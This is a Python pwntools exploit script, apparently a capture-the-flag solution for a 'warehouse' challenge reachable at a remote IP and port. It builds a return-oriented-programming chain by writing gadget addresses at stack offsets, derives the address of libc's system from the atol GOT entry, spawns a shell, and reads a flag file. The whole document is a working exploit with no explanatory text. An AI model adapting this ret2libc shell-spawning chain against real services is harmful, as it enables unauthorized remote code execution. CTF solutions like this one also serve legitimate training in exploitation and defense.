from pwn import *

ret_offset = 72
libc = ELF("libc.so.6")
atol_addr = libc.functions["atol"].address
system_addr = libc.functions["system"].address

#p = process('warehouse')
p = remote("200.136.213.83", 8888)

p.sendline(str(ret_offset))
p.sendline(str(0x8048539)) # pop eax; ret

p.sendline(str(ret_offset + 1))
p.sendline(str(0x00000000))

p.sendline(str(ret_offset + 2))
p.sendline(str(0x80486ac)) # pop ebx; pop esi; pop edi; pop ebp; ret
p.sendline(str(ret_offset + 3))
p.sendline(str(0x4024c88)) # ebx = atol GoT's
p.sendline(str(ret_offset + 4))
p.sendline(str(0x41414141))
p.sendline(str(ret_offset + 5))
p.sendline(str(0x41414141))
p.sendline(str(ret_offset + 6))
p.sendline(str(0x41414141))

p.sendline(str(ret_offset + 7))
p.sendline(str(0x8048537)) # add eax, [eax + ebx*2]; ret

p.sendline(str(ret_offset + 8))
p.sendline(str(0x80486ac)) # pop ebx; pop esi; pop edi; pop ebp; ret

p.sendline(str(ret_offset + 9))
p.sendline(str((libc.search(p32(system_addr - atol_addr)).next() - atol_addr) / 2)) # eax = eax + *(eax + ebx / 2)
p.sendline(str(ret_offset + 10))
p.sendline(str(0x41414141))
p.sendline(str(ret_offset + 11))
p.sendline(str(0x41414141))
p.sendline(str(ret_offset + 12))
p.sendline(str(0x41414141))

p.sendline(str(ret_offset + 13))
p.sendline(str(0x8048537)) # add eax, [eax + ebx*2]; ret

p.sendline(str(ret_offset + 14))
p.sendline(str(0x80486ad)) # pop esi; pop edi; pop ebp; ret

p.sendline(str(ret_offset + 18))
p.sendline(str(0x80486ad)) # pop esi; pop edi; pop ebp; ret
p.sendline(str(ret_offset + 22))
p.sendline(str(0x80486ad)) # pop esi; pop edi; pop ebp; ret
p.sendline(str(ret_offset + 26))
p.sendline(str(0x80486ae)) # pop edi; pop ebp; ret
p.sendline(str(ret_offset + 29))
p.sendline(str(0x80486ae)) # pop edi; pop ebp; ret
p.sendline(str(ret_offset + 32))
p.sendline(str(0x8048510)) # pop ebp; ret
p.sendline(str(ret_offset + 33))
p.sendline(str(0x41414141))

p.sendline(str(ret_offset + 34))
p.sendline(str(0x8048463)) # call eax

p.sendline(str(ret_offset + 36))
p.sendline(str(u32('sh\x00\x00')))

p.sendline('.')
res = p.recv()
p.sendline('cat /home/warehouse/flag.txt')
res = p.recvline()
print(res)
p.close()
